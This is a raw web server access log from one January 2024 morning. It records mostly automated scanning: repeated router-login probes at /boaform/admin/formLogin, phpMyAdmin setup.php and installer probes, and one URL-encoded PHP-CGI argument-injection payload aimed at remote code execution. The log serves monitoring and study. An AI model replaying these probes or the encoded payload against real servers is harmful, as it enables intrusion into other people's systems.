49.36.59.66 - - [27/Jan/2024:08:46:50 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
94.156.66.229 - - [27/Jan/2024:08:47:21 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:08:47:21 +0000] "" 400 0 "-" "-"
49.36.59.66 - - [27/Jan/2024:08:57:53 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1"
49.36.59.66 - - [27/Jan/2024:08:57:56 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1"
203.2.64.59 - - [27/Jan/2024:08:57:58 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
94.156.66.229 - - [27/Jan/2024:09:00:27 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:09:00:27 +0000] "" 400 0 "-" "-"
94.156.64.79 - - [27/Jan/2024:09:03:00 +0000] "POST //%63%67%69%2d%62%69%6e/%70%68%70?%2d%64+%61%6c%6c%6f%77%5f%75%72%6c%5f%69%6e%63%6c%75%64%65%3d%6f%6e+%2d%64+%73%61%66%65%5f%6d%6f%64%65%3d%6f%66%66+%2d%64+%73%75%68%6f%73%69%6e%2e%73%69%6d%75%6c%61%74%69%6f%6e%3d%6f%6e+%2d%64+%64%69%73%61%62%6c%65%5f%66%75%6e%63%74%69%6f%6e%73%3d%22%22+%2d%64+%6f%70%65%6e%5f%62%61%73%65%64%69%72%3d%6e%6f%6e%65+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%64+%63%67%69%2e%66%6f%72%63%65%5f%72%65%64%69%72%65%63%74%3d%30+%2d%64+%63%67%69%2e%72%65%64%69%72%65%63%74%5f%73%74%61%74%75%73%5f%65%6e%76%3d%30+%2d%64+%61%75%74%6f%5f%70%72%65%70%65%6e%64%5f%66%69%6c%65%3d%70%68%70%3a%2f%2f%69%6e%70%75%74+%2d%6e HTTP/1.1" 301 166 "-" "-"
198.235.24.80 - - [27/Jan/2024:09:04:20 +0000] "GET / HTTP/1.0" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
91.92.241.66 - - [27/Jan/2024:09:04:57 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
91.92.241.66 - - [27/Jan/2024:09:04:57 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:09:07:17 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:09:07:18 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:09:17:50 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:09:17:50 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:09:32:33 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:09:32:34 +0000] "" 400 0 "-" "-"
96.127.160.234 - - [27/Jan/2024:09:34:38 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
96.127.160.234 - - [27/Jan/2024:09:34:39 +0000] "" 400 0 "-" "-"
96.127.160.234 - - [27/Jan/2024:09:36:37 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
96.127.160.234 - - [27/Jan/2024:09:36:38 +0000] "" 400 0 "-" "-"
141.98.11.201 - - [27/Jan/2024:09:40:16 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
96.127.160.234 - - [27/Jan/2024:09:42:22 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
96.127.160.234 - - [27/Jan/2024:09:42:22 +0000] "" 400 0 "-" "-"
141.98.11.201 - - [27/Jan/2024:09:42:32 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0"
94.156.66.229 - - [27/Jan/2024:09:43:30 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:09:43:31 +0000] "" 400 0 "-" "-"
141.98.11.201 - - [27/Jan/2024:09:47:22 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.201 - - [27/Jan/2024:09:52:34 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.66.229 - - [27/Jan/2024:09:53:02 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:09:53:03 +0000] "" 400 0 "-" "-"
141.98.11.201 - - [27/Jan/2024:09:55:38 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
141.98.11.201 - - [27/Jan/2024:09:57:57 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.66.229 - - [27/Jan/2024:09:58:01 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:09:58:01 +0000] "" 400 0 "-" "-"
141.98.11.201 - - [27/Jan/2024:10:07:58 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.66.229 - - [27/Jan/2024:10:12:14 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:10:12:14 +0000] "" 400 0 "-" "-"
68.183.239.4 - - [27/Jan/2024:10:18:42 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4240.193 Safari/537.36"
68.183.239.4 - - [27/Jan/2024:10:18:42 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:10:22:28 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:10:22:29 +0000] "" 400 0 "-" "-"
54.64.7.191 - - [27/Jan/2024:10:23:05 +0000] "GET /dup-installer/main.installer.php HTTP/1.1" 301 166 "-" "-"
94.156.66.229 - - [27/Jan/2024:10:30:20 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:10:30:20 +0000] "" 400 0 "-" "-"
35.90.114.2 - - [27/Jan/2024:10:34:52 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64)AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36"
204.93.180.12 - - [27/Jan/2024:10:35:09 +0000] "GET / HTTP/1.0" 301 166 "-" "-"
209.170.91.200 - - [27/Jan/2024:10:35:18 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36"
94.156.67.16 - - [27/Jan/2024:10:40:13 +0000] "GET /muieblackcat HTTP/1.1" 301 166 "-" "-"
94.156.67.16 - - [27/Jan/2024:10:40:13 +0000] "GET //phpMyAdmin/scripts/setup.php HTTP/1.1" 301 166 "-" "-"
94.156.67.16 - - [27/Jan/2024:10:40:14 +0000] "GET //phpmyadmin/scripts/setup.php HTTP/1.1" 301 166 "-" "-"
94.156.67.16 - - [27/Jan/2024:10:40:14 +0000] "GET //pma/scripts/setup.php HTTP/1.1" 301 166 "-" "-"
94.156.67.16 - - [27/Jan/2024:10:40:14 +0000] "GET //myadmin/scripts/setup.php HTTP/1.1" 301 166 "-" "-"
94.156.67.16 - - [27/Jan/2024:10:40:15 +0000] "GET //MyAdmin/scripts/setup.php HTTP/1.1" 301 166 "-" "-"
94.156.66.229 - - [27/Jan/2024:10:42:00 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:10:42:00 +0000] "" 400 0 "-" "-"
164.52.0.94 - - [27/Jan/2024:10:43:33 +0000] "\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xC9\x0BMVP\xAFf\x94\x15\xA7\xA7W\x85\xB5\xC4\x1E_A\xCAm>\x0F\xC3\xEC\xE4\x88\x15\x8B\xC4\x9F\xDB\xF6 \x10\xDDs\xCB(\xA6\xD3t\xC5k`\x1B\xE8b3\xFC\x95\xD1\x90on\x5C\x95\xA9\x1D\x8Ey\xC69\x89\x8E\xD1\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 154 "-" "-"
164.52.0.94 - - [27/Jan/2024:10:43:33 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
164.52.0.94 - - [27/Jan/2024:10:43:36 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
164.52.0.94 - - [27/Jan/2024:10:44:37 +0000] "GET /favicon.ico HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
96.127.160.234 - - [27/Jan/2024:10:51:45 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
96.127.160.234 - - [27/Jan/2024:10:51:46 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:10:54:37 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:10:54:37 +0000] "" 400 0 "-" "-"
141.98.11.201 - - [27/Jan/2024:10:59:25 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.66.229 - - [27/Jan/2024:11:00:09 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:11:00:09 +0000] "" 400 0 "-" "-"
205.210.31.32 - - [27/Jan/2024:11:02:39 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
141.98.11.201 - - [27/Jan/2024:11:08:22 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.66.229 - - [27/Jan/2024:11:16:36 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:11:16:36 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:11:20:46 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:11:20:46 +0000] "" 400 0 "-" "-"
96.127.160.234 - - [27/Jan/2024:11:26:53 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
96.127.160.234 - - [27/Jan/2024:11:26:53 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:11:30:06 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:11:30:06 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:11:38:47 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:11:38:48 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:11:52:57 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:11:52:57 +0000] "" 400 0 "-" "-"
141.98.11.201 - - [27/Jan/2024:11:55:12 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0"
125.82.243.169 - - [27/Jan/2024:11:57:43 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
182.242.168.184 - - [27/Jan/2024:11:57:48 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xE3\xBBM\xE6<uic\xCBF$r\x15\xA3\x09N\xCC\x10\xCA\xE8e\x13Je\xBD\xE6\xB7l\x03\xCAb\xF8 \xAA$\x8E\xBE\xF3\x9C\x15\xE0\x86\x90\x09\x1E/p\x02T\x85gl\x90K\xD2-\xF9\xA3\xF1\xFA\xEC\x05\xABs\xD5\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
125.82.242.240 - - [27/Jan/2024:11:57:50 +0000] "\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03F,W\xC8\xFC\x1EG\xC8\xFA" 400 154 "-" "-"
94.156.66.229 - - [27/Jan/2024:12:00:39 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:12:00:40 +0000] "" 400 0 "-" "-"
43.159.128.68 - - [27/Jan/2024:12:02:40 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
141.98.11.201 - - [27/Jan/2024:12:05:26 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
141.98.11.201 - - [27/Jan/2024:12:09:15 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
94.156.66.229 - - [27/Jan/2024:12:09:32 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:12:09:32 +0000] "" 400 0 "-" "-"
198.98.51.91 - - [27/Jan/2024:12:12:09 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
198.98.51.91 - - [27/Jan/2024:12:12:09 +0000] "" 400 0 "-" "-"
141.98.11.201 - - [27/Jan/2024:12:14:41 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
164.160.5.194 - - [27/Jan/2024:12:16:17 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
94.156.66.21 - - [27/Jan/2024:12:16:43 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:12:16:44 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:12:17:51 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:12:17:51 +0000] "" 400 0 "-" "-"
198.98.51.91 - - [27/Jan/2024:12:21:44 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
198.98.51.91 - - [27/Jan/2024:12:21:44 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:12:25:31 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:12:25:32 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:12:30:31 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:12:30:32 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:12:38:28 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:12:38:28 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:12:41:24 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:12:41:25 +0000] "" 400 0 "-" "-"
141.98.11.201 - - [27/Jan/2024:12:48:23 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
94.156.66.229 - - [27/Jan/2024:12:50:50 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:12:50:50 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:12:58:23 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:12:58:24 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:12:58:52 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:12:58:52 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:13:03:23 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:13:03:24 +0000] "" 400 0 "-" "-"
35.190.199.12 - - [27/Jan/2024:13:07:26 +0000] "GET / HTTP/1.1" 301 166 "-" "python-requests/2.31.0"
94.156.66.229 - - [27/Jan/2024:13:10:28 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:13:10:28 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:13:13:17 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:13:13:17 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:13:18:05 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:13:18:05 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:13:25:08 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:13:25:08 +0000] "" 400 0 "-" "-"
162.216.149.22 - - [27/Jan/2024:13:30:37 +0000] "GET / HTTP/1.1" 301 166 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
94.156.66.229 - - [27/Jan/2024:13:35:27 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:13:35:27 +0000] "" 400 0 "-" "-"
188.126.94.180 - - [27/Jan/2024:13:38:34 +0000] "GET / HTTP/1.0" 301 166 "http://hanisntsolo.com/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
94.156.66.21 - - [27/Jan/2024:13:40:09 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:13:40:09 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:13:41:57 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:13:41:57 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:13:44:13 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:13:44:13 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:13:53:28 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:13:53:28 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [27/Jan/2024:13:53:33 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:13:53:33 +0000] "" 400 0 "-" "-"
179.43.161.130 - - [27/Jan/2024:14:00:19 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.66.229 - - [27/Jan/2024:14:01:17 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:14:01:18 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [27/Jan/2024:14:02:11 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:14:02:11 +0000] "" 400 0 "-" "-"
109.205.213.198 - - [27/Jan/2024:14:03:16 +0000] "GET / HTTP/1.1" 301 166 "-" "-"
109.205.213.198 - - [27/Jan/2024:14:07:21 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World"
94.156.66.229 - - [27/Jan/2024:14:11:14 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [27/Jan/2024:14:11:14 +0000] "" 400 0 "-" "-"
109.205.213.198 - - [27/Jan/2024:14:15:43 +0000] "GET / HTTP/1.1" 301 166 "-" "Hello World/1.0"
94.156.66.21 - - [27/Jan/2024:14:19:36 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [27/Jan/2024:14:19:36 +0000] "" 400 0 "-" "-"
96.127.160.234 - - [27/Jan/2024:14:22:58 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
96.127.160.234 - - [27/Jan/2024:14:22:58 +0000] "" 400 0 "-" "-"
